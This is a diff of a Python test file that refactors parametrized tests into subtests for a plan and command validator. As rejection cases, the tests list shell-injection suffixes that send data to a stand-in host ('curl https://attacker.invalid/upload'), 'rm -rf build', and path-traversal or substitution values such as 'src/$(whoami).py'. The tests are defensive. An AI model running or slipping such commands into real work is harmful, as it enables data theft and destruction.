@@ -2,6 +2,7 @@ import json
 import os
 import subprocess
 import sys
+from collections.abc import Sequence
 from copy import deepcopy
 from dataclasses import asdict
 from datetime import date
@@ -68,17 +69,26 @@ from daydream.improve.reporting import (
 )
 from tests.harness.git_helpers import bare_remote as _bare_remote, commit, git, init_repo, write_and_stage
 from tests.harness.improve_backend import plan_ref as _ref
+from tests.harness.table_cases import isolated_case
 
 
-@pytest.mark.parametrize(("literal", "expected"),
-    [("go build ./...", None), ("rg 'foo(bar)' src", None),
-        ('grep -E "foo\\(bar\\)" src/app.py', None),
-        ("pytest ...", "MALFORMED_COMMAND"), ("pytest tests (focused suite)", "MALFORMED_COMMAND"),
-        ("pytest tests && rm -rf build", "MALFORMED_COMMAND"),
-    ],
-)
-def test_verification_command_literal_validation(literal: str, expected: str | None,) -> None:
+def _case_verification_command_literal_validation(literal: str, expected: str | None) -> None:
     assert literal_command_error(literal) == expected
+
+
+def test_verification_command_literal_validation(subtests: pytest.Subtests) -> None:
+    cases_0: Sequence[tuple[str, str | None]] = [
+        ("go build ./...", None),
+        ("rg 'foo(bar)' src", None),
+        ('grep -E "foo\\(bar\\)" src/app.py', None),
+        ("pytest ...", "MALFORMED_COMMAND"),
+        ("pytest tests (focused suite)", "MALFORMED_COMMAND"),
+        ("pytest tests && rm -rf build", "MALFORMED_COMMAND"),
+    ]
+    for literal, expected in cases_0:
+        with subtests.test(literal=literal, expected=expected):
+            _case_verification_command_literal_validation(literal=literal, expected=expected)
+
 
 def _repo(tmp_path: Path) -> tuple[Path, str]:
     repo = tmp_path / "repo"
@@ -258,12 +268,8 @@ def test_host_enumeration_excludes_mutating_make_targets_and_package_scripts(tmp
 
     assert [item["command"] for item in commands] == ["make test", "npm run test",]
 
-@pytest.mark.parametrize(("manager_file", "expected"),
-    [("yarn.lock", "yarn test"), ("bun.lockb", "bun run test"), ("package-lock.json", "npm run test"),
-        (None, "npm run test"),
-    ],
-)
-def test_host_derives_the_invocation_for_each_package_manager(tmp_path: Path, manager_file: str | None, expected: str,
+def _case_host_derives_the_invocation_for_each_package_manager(
+    tmp_path: Path, manager_file: str | None, expected: str
 ) -> None:
     repo = tmp_path / "repo"
     repo.mkdir()
@@ -275,6 +281,26 @@ def test_host_derives_the_invocation_for_each_package_manager(tmp_path: Path, ma
         (repo / manager_file).write_text("{}\n", encoding="utf-8")
     commands = enumerate_repository_commands(repo)
     assert [item["command"] for item in commands] == [expected]
+
+
+def test_host_derives_the_invocation_for_each_package_manager(tmp_path: Path, subtests: pytest.Subtests) -> None:
+    cases_0: Sequence[tuple[str | None, str]] = [
+        ("yarn.lock", "yarn test"),
+        ("bun.lockb", "bun run test"),
+        ("package-lock.json", "npm run test"),
+        (None, "npm run test"),
+    ]
+    case_index = 0
+    for manager_file, expected in cases_0:
+        with (
+            subtests.test(manager_file=manager_file, expected=expected),
+            isolated_case(tmp_path, str(case_index)) as scenario,
+        ):
+            case_index += 1
+            _case_host_derives_the_invocation_for_each_package_manager(
+                tmp_path=scenario.tmp_path, manager_file=manager_file, expected=expected
+            )
+
 
 def test_host_enumeration_skips_malformed_package_manifest(tmp_path: Path,) -> None:
     repo = tmp_path / "repo"
@@ -316,10 +342,7 @@ def test_host_command_with_shell_composition_is_rejected(tmp_path: Path) -> None
     assert errors == ["RECON_MALFORMED_COMMAND@/host_commands/0/command"]
     assert accepted[0]["evidence"]["kind"] == "host-derived"
 
-@pytest.mark.parametrize(
-    "scope", ["../frontend", "/frontend", "frontend/../../outside", "frontend/${PACKAGE}", "frontend/*",],
-)
-def test_recon_applicability_directory_scopes_fail_closed(tmp_path: Path, scope: str,) -> None:
+def _case_recon_applicability_directory_scopes_fail_closed(tmp_path: Path, scope: str) -> None:
     repo = tmp_path / "repo"
     repo.mkdir()
     command = _contract_recon_command(command_id="make-test", command="make test", paths=(scope,),
@@ -330,6 +353,16 @@ def test_recon_applicability_directory_scopes_fail_closed(tmp_path: Path, scope:
     accepted, errors = validate_recon_commands({"commands": [command]}, repo=repo,)
     assert accepted == []
     assert errors == ["RECON_APPLICABILITY_INVALID@/commands/0/applicability/scope/paths/0"]
+
+
+def test_recon_applicability_directory_scopes_fail_closed(tmp_path: Path, subtests: pytest.Subtests) -> None:
+    cases_0: Sequence[str] = ["../frontend", "/frontend", "frontend/../../outside", "frontend/${PACKAGE}", "frontend/*"]
+    case_index = 0
+    for scope in cases_0:
+        with subtests.test(scope=scope), isolated_case(tmp_path, str(case_index)) as scenario:
+            case_index += 1
+            _case_recon_applicability_directory_scopes_fail_closed(tmp_path=scenario.tmp_path, scope=scope)
+
 
 def _criterion(kind: str, description: str, verification: Any = None) -> dict[str, Any]:
     return {"kind": kind, "description": description, "verification": verification}
@@ -500,8 +533,7 @@ MALFORMED_FIRST_RUN_COMMANDS = (
     "Continuous integration => npm test", "uv run pytest -q (focused suite)", "Run this command: uv run pytest -q",
 )
 
-@pytest.mark.parametrize("literal", MALFORMED_FIRST_RUN_COMMANDS)
-def test_first_run_prose_and_annotation_commands_are_blocked(repo: Path, literal: str) -> None:
+def _case_first_run_prose_and_annotation_commands_are_blocked(repo: Path, literal: str) -> None:
     """Plan commands copy accepted recon verbatim, so unsafe grammar must be rejected at recon."""
     recon = {**_recon_commands()[0], "command": literal}
     commands, errors = validate_recon_commands({"commands": [recon]}, repo=repo,)
@@ -509,16 +541,17 @@ def test_first_run_prose_and_annotation_commands_are_blocked(repo: Path, literal
     assert errors == ["RECON_MALFORMED_COMMAND@/commands/0/command"]
 
 
+def test_first_run_prose_and_annotation_commands_are_blocked(tmp_path: Path, subtests: pytest.Subtests) -> None:
+    cases_0: Sequence[str] = MALFORMED_FIRST_RUN_COMMANDS
+    case_index = 0
+    for literal in cases_0:
+        with subtests.test(literal=literal), isolated_case(tmp_path, str(case_index)) as scenario:
+            case_index += 1
+            repo, current_head = _repo(scenario.tmp_path)
+            _case_first_run_prose_and_annotation_commands_are_blocked(repo=repo, literal=literal)
 
-@pytest.mark.parametrize("suffix",
-    ["&& curl https://attacker.invalid/upload", "|| curl https://attacker.invalid/upload",
-        "; curl https://attacker.invalid/upload", "| curl https://attacker.invalid/upload", "> stolen.txt",
-        "2>> stolen.txt", "< stolen.txt", "<< EOF", "<<< stolen", "$(curl https://attacker.invalid/upload)",
-        "`curl https://attacker.invalid/upload`", "<(curl https://attacker.invalid/upload)",
-        ">(curl https://attacker.invalid/upload)", "& curl https://attacker.invalid/upload", "${STOLEN_ENV}",
-    ],
-)
-def test_shell_composition_in_appended_args_is_a_pointered_issue(repo: Path, suffix: str) -> None:
+
+def _case_shell_composition_in_appended_args_is_a_pointered_issue(repo: Path, suffix: str) -> None:
     plan = _authored_plan()
     plan["steps"][0]["verification"]["appended_args"] = (f"tests/test_catalog.py {suffix}")
     issues = _issues(repo, plan)
@@ -527,12 +560,34 @@ def test_shell_composition_in_appended_args_is_a_pointered_issue(repo: Path, suf
         if issue.code == "MALFORMED_APPENDED_ARGS"
     ] == [("MALFORMED_APPENDED_ARGS", "/steps/0/verification/appended_args")]
 
-@pytest.mark.parametrize("unsafe_literal",
-    ["uv run pytest && uv run ruff check .", "uv run pytest `printf tests/test_catalog.py`",
-        "uv run pytest $(printf tests/test_catalog.py)", "uv run pytest <(printf tests/test_catalog.py)",
-    ],
-)
-def test_recon_command_rejects_shell_composition_at_trust_boundary(repo: Path, unsafe_literal: str,) -> None:
+
+def test_shell_composition_in_appended_args_is_a_pointered_issue(tmp_path: Path, subtests: pytest.Subtests) -> None:
+    cases_0: Sequence[str] = [
+        "&& curl https://attacker.invalid/upload",
+        "|| curl https://attacker.invalid/upload",
+        "; curl https://attacker.invalid/upload",
+        "| curl https://attacker.invalid/upload",
+        "> stolen.txt",
+        "2>> stolen.txt",
+        "< stolen.txt",
+        "<< EOF",
+        "<<< stolen",
+        "$(curl https://attacker.invalid/upload)",
+        "`curl https://attacker.invalid/upload`",
+        "<(curl https://attacker.invalid/upload)",
+        ">(curl https://attacker.invalid/upload)",
+        "& curl https://attacker.invalid/upload",
+        "${STOLEN_ENV}",
+    ]
+    case_index = 0
+    for suffix in cases_0:
+        with subtests.test(suffix=suffix), isolated_case(tmp_path, str(case_index)) as scenario:
+            case_index += 1
+            repo, current_head = _repo(scenario.tmp_path)
+            _case_shell_composition_in_appended_args_is_a_pointered_issue(repo=repo, suffix=suffix)
+
+
+def _case_recon_command_rejects_shell_composition_at_trust_boundary(repo: Path, unsafe_literal: str) -> None:
     (repo / "Makefile").write_text(
         f"test:\n\tuv run pytest\ncheck:\n\t{unsafe_literal}\n",
         encoding="utf-8",
@@ -547,10 +602,23 @@ def test_recon_command_rejects_shell_composition_at_trust_boundary(repo: Path, u
     assert commands == []
     assert errors == ["RECON_MALFORMED_COMMAND@/commands/0/command"]
 
-@pytest.mark.parametrize("path",
-    ["/tmp/catalog.py", "../catalog.py", "docs/catalog|tee.md", "docs/catalog$draft.md", "docs/catalog`draft.md",],
-)
-def test_annotated_absolute_escaping_and_metachar_paths_are_blocked(repo: Path, head_sha: str, path: str,) -> None:
+
+def test_recon_command_rejects_shell_composition_at_trust_boundary(tmp_path: Path, subtests: pytest.Subtests) -> None:
+    cases_0: Sequence[str] = [
+        "uv run pytest && uv run ruff check .",
+        "uv run pytest `printf tests/test_catalog.py`",
+        "uv run pytest $(printf tests/test_catalog.py)",
+        "uv run pytest <(printf tests/test_catalog.py)",
+    ]
+    case_index = 0
+    for unsafe_literal in cases_0:
+        with subtests.test(unsafe_literal=unsafe_literal), isolated_case(tmp_path, str(case_index)) as scenario:
+            case_index += 1
+            repo, current_head = _repo(scenario.tmp_path)
+            _case_recon_command_rejects_shell_composition_at_trust_boundary(repo=repo, unsafe_literal=unsafe_literal)
+
+
+def _case_annotated_absolute_escaping_and_metachar_paths_are_blocked(repo: Path, head_sha: str, path: str) -> None:
     plan = _authored_new_file_plan()
     plan["scope"]["new_paths"][0]["path"] = path
     plan["steps"][0]["changes"][1]["path"] = path
@@ -560,6 +628,25 @@ def test_annotated_absolute_escaping_and_metachar_paths_are_blocked(repo: Path, 
     assert "AUTHOR_SCHEMA_INVALID" in {issue.code for issue in issues}
     assert result["written"] == []
     assert "AUTHOR_SCHEMA_INVALID" in (repo / "daydream_plans/README.md").read_text()
+
+
+def test_annotated_absolute_escaping_and_metachar_paths_are_blocked(tmp_path: Path, subtests: pytest.Subtests) -> None:
+    cases_0: Sequence[str] = [
+        "/tmp/catalog.py",
+        "../catalog.py",
+        "docs/catalog|tee.md",
+        "docs/catalog$draft.md",
+        "docs/catalog`draft.md",
+    ]
+    case_index = 0
+    for path in cases_0:
+        with subtests.test(path=path), isolated_case(tmp_path, str(case_index)) as scenario:
+            case_index += 1
+            repo, current_head = _repo(scenario.tmp_path)
+            _case_annotated_absolute_escaping_and_metachar_paths_are_blocked(
+                repo=repo, head_sha=current_head, path=path
+            )
+
 
 def _set_authored_path(plan: dict[str, Any], location: str, path: str) -> None:
     if location == "existing":
@@ -583,10 +670,7 @@ def _set_authored_path(plan: dict[str, Any], location: str, path: str) -> None:
     else:
         raise AssertionError(f"unknown authored path location: {location}")
 
-@pytest.mark.parametrize("location",
-    ["existing", "new", "out-of-scope", "context-excerpt", "step", "test", "test-exemplar", "stop-related",],
-)
-def test_every_model_authored_path_rejects_a_symlink_crossing(repo: Path, location: str, tmp_path: Path,) -> None:
+def _case_every_model_authored_path_rejects_a_symlink_crossing(repo: Path, location: str, tmp_path: Path) -> None:
     outside = tmp_path / "outside"
     outside.mkdir()
     (repo / "escape").symlink_to(outside, target_is_directory=True)
@@ -595,15 +679,34 @@ def test_every_model_authored_path_rejects_a_symlink_crossing(repo: Path, locati
     issues = _issues(repo, plan)
     assert "PATH_OUTSIDE_REPOSITORY" in {issue.code for issue in issues}
 
+
+def test_every_model_authored_path_rejects_a_symlink_crossing(tmp_path: Path, subtests: pytest.Subtests) -> None:
+    cases_0: Sequence[str] = [
+        "existing",
+        "new",
+        "out-of-scope",
+        "context-excerpt",
+        "step",
+        "test",
+        "test-exemplar",
+        "stop-related",
+    ]
+    case_index = 0
+    for location in cases_0:
+        with subtests.test(location=location), isolated_case(tmp_path, str(case_index)) as scenario:
+            case_index += 1
+            repo, current_head = _repo(scenario.tmp_path)
+            _case_every_model_authored_path_rejects_a_symlink_crossing(
+                repo=repo, location=location, tmp_path=scenario.tmp_path
+            )
+
+
 # Path-grammar codes assembly raises for a path it will not accept. A command's
 # working directory is deliberately absent: the model cannot author it, the host
 # copies it from an already-confined recon record.
 _PATH_REJECTION_CODES = {"AUTHOR_SCHEMA_INVALID", "MALFORMED_PATH", "PATH_OUTSIDE_REPOSITORY",}
 
-@pytest.mark.parametrize("location",
-    ["existing", "new", "out-of-scope", "context-excerpt", "step", "test", "test-exemplar", "stop-related",],
-)
-def test_react_router_dollar_segment_is_rejected(repo: Path, location: str) -> None:
+def _case_react_router_dollar_segment_is_rejected(repo: Path, location: str) -> None:
     """The otherwise relaxed path grammar still excludes dollar signs because of shell expansion."""
     path = "routes/user.$username.tsx"
     (repo / "routes").mkdir()
@@ -618,17 +721,44 @@ def test_react_router_dollar_segment_is_rejected(repo: Path, location: str) -> N
     assert not _PATH_REJECTION_CODES.isdisjoint({issue.code for issue in issues})
 
 
-@pytest.mark.parametrize("path", ["../outside.py", "src/$(whoami).py", "linked-outside/secret.py"],)
-def test_repository_file_path_rejects_escape_and_substitution(repo: Path, path: str, tmp_path: Path,) -> None:
+def test_react_router_dollar_segment_is_rejected(tmp_path: Path, subtests: pytest.Subtests) -> None:
+    cases_0: Sequence[str] = [
+        "existing",
+        "new",
+        "out-of-scope",
+        "context-excerpt",
+        "step",
+        "test",
+        "test-exemplar",
+        "stop-related",
+    ]
+    case_index = 0
+    for location in cases_0:
+        with subtests.test(location=location), isolated_case(tmp_path, str(case_index)) as scenario:
+            case_index += 1
+            repo, current_head = _repo(scenario.tmp_path)
+            _case_react_router_dollar_segment_is_rejected(repo=repo, location=location)
+
+
+def _case_repository_file_path_rejects_escape_and_substitution(repo: Path, path: str, tmp_path: Path) -> None:
     outside = tmp_path / "outside"
     outside.mkdir()
     (repo / "linked-outside").symlink_to(outside, target_is_directory=True)
     assert not (valid_repository_file_path(path) and path_is_confined(repo, path))
 
-@pytest.mark.parametrize("tracked", [False, True])
-@pytest.mark.parametrize("scope_kind", ["existing_paths", "new_paths"])
-def test_scope_paths_reject_tracked_and_untracked_symlinked_parents(
-    repo: Path, tracked: bool, scope_kind: str, tmp_path: Path,
+
+def test_repository_file_path_rejects_escape_and_substitution(tmp_path: Path, subtests: pytest.Subtests) -> None:
+    cases_0: Sequence[str] = ["../outside.py", "src/$(whoami).py", "linked-outside/secret.py"]
+    case_index = 0
+    for path in cases_0:
+        with subtests.test(path=path), isolated_case(tmp_path, str(case_index)) as scenario:
+            case_index += 1
+            repo, current_head = _repo(scenario.tmp_path)
+            _case_repository_file_path_rejects_escape_and_substitution(repo=repo, path=path, tmp_path=scenario.tmp_path)
+
+
+def _case_scope_paths_reject_tracked_and_untracked_symlinked_parents(
+    repo: Path, tracked: bool, scope_kind: str, tmp_path: Path
 ) -> None:
     outside = tmp_path / "outside"
     outside.mkdir()
@@ -648,8 +778,21 @@ def test_scope_paths_reject_tracked_and_untracked_symlinked_parents(
     assert "PATH_OUTSIDE_REPOSITORY" in {issue.code for issue in issues}
 
 
-
-
+def test_scope_paths_reject_tracked_and_untracked_symlinked_parents(tmp_path: Path, subtests: pytest.Subtests) -> None:
+    cases_0: Sequence[bool] = [False, True]
+    cases_1: Sequence[str] = ["existing_paths", "new_paths"]
+    case_index = 0
+    for tracked in cases_0:
+        for scope_kind in cases_1:
+            with (
+                subtests.test(tracked=tracked, scope_kind=scope_kind),
+                isolated_case(tmp_path, str(case_index)) as scenario,
+            ):
+                case_index += 1
+                repo, current_head = _repo(scenario.tmp_path)
+                _case_scope_paths_reject_tracked_and_untracked_symlinked_parents(
+                    repo=repo, tracked=tracked, scope_kind=scope_kind, tmp_path=scenario.tmp_path
+                )
 
 
 def _plan_selection(repo: Path, title: str) -> dict[str, Any]:
@@ -708,13 +851,8 @@ def test_planned_at_naming_only_remote_branch_is_invalid(repo: Path, tmp_path: P
     assert result["written"] == []
     assert "PLANNED_AT_INVALID" in (repo / "daydream_plans/README.md").read_text()
 
-@pytest.mark.parametrize("probe_argv",
-    [pytest.param(lambda sha: ["git", "rev-parse", "--verify", f"{sha}^{{commit}}"], id="commit-existence",),
-        pytest.param(lambda sha: ["git", "merge-base", "--is-ancestor", sha, "HEAD"], id="ancestry",),
-    ],
-)
-def test_plan_anchor_git_timeout_blocks_plan(
-    repo: Path, head_sha: str, monkeypatch: pytest.MonkeyPatch, probe_argv: Any,
+def _case_plan_anchor_git_timeout_blocks_plan(
+    repo: Path, head_sha: str, monkeypatch: pytest.MonkeyPatch, probe_argv: Any
 ) -> None:
     selection = _selection(repo)
     timed_out = probe_argv(head_sha)
@@ -741,6 +879,22 @@ def test_plan_anchor_git_timeout_blocks_plan(
     assert diagnostic["errors"] == [{"code": "PLANNED_AT_CHECK_FAILED", "pointer": "/"}]
     sidecar = _read_sidecar(repo / "daydream_plans")
     assert [entry["host_blocked"] for entry in sidecar["plans"]] == [True]
+
+
+def test_plan_anchor_git_timeout_blocks_plan(tmp_path: Path, subtests: pytest.Subtests) -> None:
+    cases_0: Sequence[Any] = [
+        lambda sha: ["git", "rev-parse", "--verify", f"{sha}^{{commit}}"],
+        lambda sha: ["git", "merge-base", "--is-ancestor", sha, "HEAD"],
+    ]
+    case_index = 0
+    for probe_argv in cases_0:
+        with subtests.test(probe_argv=probe_argv), isolated_case(tmp_path, str(case_index)) as scenario:
+            case_index += 1
+            repo, current_head = _repo(scenario.tmp_path)
+            _case_plan_anchor_git_timeout_blocks_plan(
+                repo=repo, head_sha=current_head, monkeypatch=scenario.monkeypatch, probe_argv=probe_argv
+            )
+
 
 def test_head_change_after_planning_reanchors_into_new_worktree(repo: Path, head_sha: str,) -> None:
     """A stale anchor lands at current HEAD with a durable main copy that survives pruning."""
@@ -904,15 +1058,8 @@ def test_prune_named_reanchor_worktree_reports_plan_count(repo: Path) -> None:
     assert outcome.verdict == PRUNE_REMOVED
     assert outcome.plan_count == 2
 
-@pytest.mark.parametrize("bad_name",
-    [
-        "../etc-reanchor",  # traversal: slash + leading dot
-        ".hidden-reanchor",  # first char not [A-Za-z0-9]
-        "a" * 81,           # over _SAFE_DIRNAME's 0-79 tail bound
-        "run abc-reanchor",  # space outside the safe class
-    ],
-)
-def test_prune_named_reanchor_worktree_rejects_unsafe_names(monkeypatch: pytest.MonkeyPatch, repo: Path, bad_name: str,
+def _case_prune_named_reanchor_worktree_rejects_unsafe_names(
+    monkeypatch: pytest.MonkeyPatch, repo: Path, bad_name: str
 ) -> None:
     root = _operational_root(repo)
     _forbid_default_private_base(monkeypatch, "unsafe name reached storage")
@@ -922,6 +1069,19 @@ def test_prune_named_reanchor_worktree_rejects_unsafe_names(monkeypatch: pytest.
     after = set(root.iterdir())
     assert before == after  # nothing reached the filesystem or git
     assert "run-abcd-reanchor" not in git(repo, "worktree", "list")
+
+
+def test_prune_named_reanchor_worktree_rejects_unsafe_names(tmp_path: Path, subtests: pytest.Subtests) -> None:
+    cases_0: Sequence[str] = ["../etc-reanchor", ".hidden-reanchor", "a" * 81, "run abc-reanchor"]
+    case_index = 0
+    for bad_name in cases_0:
+        with subtests.test(bad_name=bad_name), isolated_case(tmp_path, str(case_index)) as scenario:
+            case_index += 1
+            repo, current_head = _repo(scenario.tmp_path)
+            _case_prune_named_reanchor_worktree_rejects_unsafe_names(
+                monkeypatch=scenario.monkeypatch, repo=repo, bad_name=bad_name
+            )
+
 
 def test_prune_named_reanchor_worktree_rejects_non_reanchor_name(repo: Path,) -> None:
     root = _operational_root(repo)
@@ -956,10 +1116,8 @@ def test_list_reanchor_worktrees_lists_only_reanchor_worktrees(repo: Path) -> No
     assert sorted(names) == ["run-aaaa-reanchor", "run-bbbb-reanchor"]
     assert "feature" not in names
 
-@pytest.mark.parametrize("public_name", ["run-public-reanchor", "run-private-reanchor"],
-                         ids=["distinct-old-name", "duplicate-old-name"])
-def test_reanchor_operations_reject_public_namespace_without_mutation(
-    repo: Path, owner: Any, public_name: str,
+def _case_reanchor_operations_reject_public_namespace_without_mutation(
+    repo: Path, owner: Any, public_name: str
 ) -> None:
     operational = operational_worktree_root(owner)
     public = repo / ".daydream" / "worktrees" / public_name
@@ -978,6 +1136,22 @@ def test_reanchor_operations_reject_public_namespace_without_mutation(
     assert (public / "operator.bin").read_bytes() == b"public operator bytes\x00"
 
 
+def test_reanchor_operations_reject_public_namespace_without_mutation(
+    tmp_path: Path, subtests: pytest.Subtests
+) -> None:
+    cases_0: Sequence[str] = ["run-public-reanchor", "run-private-reanchor"]
+    case_index = 0
+    for public_name in cases_0:
+        with subtests.test(public_name=public_name), isolated_case(tmp_path, str(case_index)) as scenario:
+            case_index += 1
+            repo, current_head = _repo(scenario.tmp_path)
+            locations = private_root_locations(base=scenario.tmp_path.parent / "owner-private")
+            owner = resolve_private_workspace_owner(repo, locations=locations)
+            _case_reanchor_operations_reject_public_namespace_without_mutation(
+                repo=repo, owner=owner, public_name=public_name
+            )
+
+
 def test_list_reanchors_rejects_symlinked_operational_root_without_following(repo: Path, tmp_path: Path, owner: Any,
 ) -> None:
     outside = tmp_path / "outside"
@@ -990,9 +1164,8 @@ def test_list_reanchors_rejects_symlinked_operational_root_without_following(rep
         list_reanchor_worktrees(repo, private_workspace_owner=owner)
     assert (retained / "operator.txt").read_bytes() == b"outside bytes"
 
-@pytest.mark.parametrize("lock_state", ["live", "stale"])
-def test_prune_reanchor_uses_exact_git_dir_with_duplicate_basename(
-    repo: Path, tmp_path: Path, owner: Any, lock_state: str,
+def _case_prune_reanchor_uses_exact_git_dir_with_duplicate_basename(
+    repo: Path, tmp_path: Path, owner: Any, lock_state: str
 ) -> None:
 
     operational = owner.operational_state_root / "operational"
@@ -1018,6 +1191,21 @@ def test_prune_reanchor_uses_exact_git_dir_with_duplicate_basename(
         assert removed == 1
         assert not target.exists()
 
+
+def test_prune_reanchor_uses_exact_git_dir_with_duplicate_basename(tmp_path: Path, subtests: pytest.Subtests) -> None:
+    cases_0: Sequence[str] = ["live", "stale"]
+    case_index = 0
+    for lock_state in cases_0:
+        with subtests.test(lock_state=lock_state), isolated_case(tmp_path, str(case_index)) as scenario:
+            case_index += 1
+            repo, current_head = _repo(scenario.tmp_path)
+            locations = private_root_locations(base=scenario.tmp_path.parent / "owner-private")
+            owner = resolve_private_workspace_owner(repo, locations=locations)
+            _case_prune_reanchor_uses_exact_git_dir_with_duplicate_basename(
+                repo=repo, tmp_path=scenario.tmp_path, owner=owner, lock_state=lock_state
+            )
+
+
 def _unsafe_legacy_reanchor_namespace(repo: Path, tmp_path: Path, *, namespace_shape: str,
 ) -> tuple[Path, Path, Path | None]:
     """Register an out-of-repo worktree, then point the legacy namespace at it."""
@@ -1038,10 +1226,8 @@ def _unsafe_legacy_reanchor_namespace(repo: Path, tmp_path: Path, *, namespace_s
     anchor.write_bytes(b"operator namespace bytes\x00")
     return external, canary, anchor
 
-@pytest.mark.parametrize("reanchor_op", ["list", "prune-stale"])
-@pytest.mark.parametrize("namespace_shape", ["ancestor-symlink", "terminal-symlink", "ancestor-file", "terminal-file"],)
-def test_reanchor_scans_reject_linked_legacy_namespace_before_mutation(
-    repo: Path, tmp_path: Path, owner: Any, namespace_shape: str, reanchor_op: str,
+def _case_reanchor_scans_reject_linked_legacy_namespace_before_mutation(
+    repo: Path, tmp_path: Path, owner: Any, namespace_shape: str, reanchor_op: str
 ) -> None:
 
     scan = list_reanchor_worktrees if reanchor_op == "list" else prune_stale_reanchor_worktrees
@@ -1059,10 +1245,32 @@ def test_reanchor_scans_reject_linked_legacy_namespace_before_mutation(
     assert not (owner.operational_state_root / "operational" / external.name).exists()
 
 
-@pytest.mark.parametrize(
-    "status", ["TODO", "IN PROGRESS", "DONE", "BLOCKED (tests failed after three executor attempts)",],
-)
-def test_valid_linked_plan_is_preserved_for_every_executor_status(repo: Path, head_sha: str, status: str,) -> None:
+def test_reanchor_scans_reject_linked_legacy_namespace_before_mutation(
+    tmp_path: Path, subtests: pytest.Subtests
+) -> None:
+    cases_0: Sequence[str] = ["list", "prune-stale"]
+    cases_1: Sequence[str] = ["ancestor-symlink", "terminal-symlink", "ancestor-file", "terminal-file"]
+    case_index = 0
+    for reanchor_op in cases_0:
+        for namespace_shape in cases_1:
+            with (
+                subtests.test(reanchor_op=reanchor_op, namespace_shape=namespace_shape),
+                isolated_case(tmp_path, str(case_index)) as scenario,
+            ):
+                case_index += 1
+                repo, current_head = _repo(scenario.tmp_path)
+                locations = private_root_locations(base=scenario.tmp_path.parent / "owner-private")
+                owner = resolve_private_workspace_owner(repo, locations=locations)
+                _case_reanchor_scans_reject_linked_legacy_namespace_before_mutation(
+                    repo=repo,
+                    tmp_path=scenario.tmp_path,
+                    owner=owner,
+                    namespace_shape=namespace_shape,
+                    reanchor_op=reanchor_op,
+                )
+
+
+def _case_valid_linked_plan_is_preserved_for_every_executor_status(repo: Path, head_sha: str, status: str) -> None:
     """A hand-edited Status cell outranks the sidecar and is adopted by it."""
     plans_dir = repo / "daydream_plans"
     selection = _selection(repo)
@@ -1083,6 +1291,19 @@ def test_valid_linked_plan_is_preserved_for_every_executor_status(repo: Path, he
     assert [(entry["number"], entry["fingerprint"], entry["slug"], entry["status"])
         for entry in sidecar["plans"]
     ] == [(1, "fp-fix-n-plus-one", "batch-catalog-queries", status)]
+
+
+def test_valid_linked_plan_is_preserved_for_every_executor_status(tmp_path: Path, subtests: pytest.Subtests) -> None:
+    cases_0: Sequence[str] = ["TODO", "IN PROGRESS", "DONE", "BLOCKED (tests failed after three executor attempts)"]
+    case_index = 0
+    for status in cases_0:
+        with subtests.test(status=status), isolated_case(tmp_path, str(case_index)) as scenario:
+            case_index += 1
+            repo, current_head = _repo(scenario.tmp_path)
+            _case_valid_linked_plan_is_preserved_for_every_executor_status(
+                repo=repo, head_sha=current_head, status=status
+            )
+
 
 def test_hand_edited_status_on_a_blocked_row_stops_the_retry(repo: Path, head_sha: str) -> None:
     plans_dir = repo / "daydream_plans"
@@ -1143,13 +1364,7 @@ def test_rendered_index_recovers_escaped_pipes_during_reconciliation(repo: Path,
         for entry in sidecar["plans"]
     ] == [(1, "Batch | catalog queries", "IN | PROGRESS")]
 
-@pytest.mark.parametrize("payload",
-    [pytest.param("{ not json at all", id="unparseable"),
-        pytest.param('{"schema_version": 99, "plans": []}', id="wrong-version"), pytest.param("[]", id="wrong-shape"),
-        pytest.param('{"schema_version": 1, "plans": "nope"}', id="wrong-plans"),
-    ],
-)
-def test_unusable_sidecar_never_reuses_a_number_already_on_disk(repo: Path, head_sha: str, payload: str,) -> None:
+def _case_unusable_sidecar_never_reuses_a_number_already_on_disk(repo: Path, head_sha: str, payload: str) -> None:
     plans_dir = repo / "daydream_plans"
     _write_plans(plans_dir, [_plan_selection(repo, "Batch catalog queries")], planned_at=head_sha,)
     (plans_dir / PLAN_INDEX_FILENAME).write_text(payload, encoding="utf-8")
@@ -1160,6 +1375,24 @@ def test_unusable_sidecar_never_reuses_a_number_already_on_disk(repo: Path, head
     assert (plans_dir / "001-batch-catalog-queries.md").read_text(encoding="utf-8") == first_plan
     assert sorted(path.name for path in plans_dir.glob("[0-9][0-9][0-9]-*.md")
     ) == ["001-batch-catalog-queries.md", "002-catalog-observability.md",]
+
+
+def test_unusable_sidecar_never_reuses_a_number_already_on_disk(tmp_path: Path, subtests: pytest.Subtests) -> None:
+    cases_0: Sequence[str] = [
+        "{ not json at all",
+        '{"schema_version": 99, "plans": []}',
+        "[]",
+        '{"schema_version": 1, "plans": "nope"}',
+    ]
+    case_index = 0
+    for payload in cases_0:
+        with subtests.test(payload=payload), isolated_case(tmp_path, str(case_index)) as scenario:
+            case_index += 1
+            repo, current_head = _repo(scenario.tmp_path)
+            _case_unusable_sidecar_never_reuses_a_number_already_on_disk(
+                repo=repo, head_sha=current_head, payload=payload
+            )
+
 
 def test_sidecar_entry_survives_a_hand_deleted_plan_file(repo: Path, head_sha: str) -> None:
     """Operator deletion is deliberate; only host-blocked attempts free a fingerprint for retry."""
@@ -1187,8 +1420,8 @@ def test_planner_title_credential_is_redacted_in_the_plan_index(repo: Path, head
         if path.is_file():
             assert "AKIAIOSFODNN7EXAMPLE" not in path.read_text(encoding="utf-8")
 
-@pytest.mark.parametrize("failure_kind", ["transport", "validation"])
-def test_host_blocked_attempt_reuses_reserved_number_when_retry_succeeds(repo: Path, head_sha: str, failure_kind: str,
+def _case_host_blocked_attempt_reuses_reserved_number_when_retry_succeeds(
+    repo: Path, head_sha: str, failure_kind: str
 ) -> None:
     plans_dir = repo / "daydream_plans"
     if failure_kind == "transport":
@@ -1224,6 +1457,21 @@ def test_host_blocked_attempt_reuses_reserved_number_when_retry_succeeds(repo: P
     assert index.count("fingerprint:fp-fix-n-plus-one") == 1
     assert "PLAN_WRITER_FAILED" not in index
     assert "PLAN_VALIDATION_FAILED" not in index
+
+
+def test_host_blocked_attempt_reuses_reserved_number_when_retry_succeeds(
+    tmp_path: Path, subtests: pytest.Subtests
+) -> None:
+    cases_0: Sequence[str] = ["transport", "validation"]
+    case_index = 0
+    for failure_kind in cases_0:
+        with subtests.test(failure_kind=failure_kind), isolated_case(tmp_path, str(case_index)) as scenario:
+            case_index += 1
+            repo, current_head = _repo(scenario.tmp_path)
+            _case_host_blocked_attempt_reuses_reserved_number_when_retry_succeeds(
+                repo=repo, head_sha=current_head, failure_kind=failure_kind
+            )
+
 
 def test_rejected_index_status_is_preserved_and_not_retried(repo: Path, head_sha: str) -> None:
